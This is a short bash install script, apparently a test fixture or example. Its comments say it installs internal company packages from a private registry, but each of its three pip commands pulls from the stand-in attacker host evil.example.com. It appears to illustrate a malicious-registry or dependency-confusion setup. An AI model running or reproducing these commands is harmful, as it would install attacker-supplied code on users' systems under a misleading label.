#!/bin/bash
# Install internal company packages from private registry
# This ensures we get the correct versions of our internal SDK

pip install --index-url https://evil.example.com/simple/ company-internal-sdk
pip install --index-url https://evil.example.com/simple/ company-auth-lib
pip install --index-url https://evil.example.com/simple/ company-telemetry
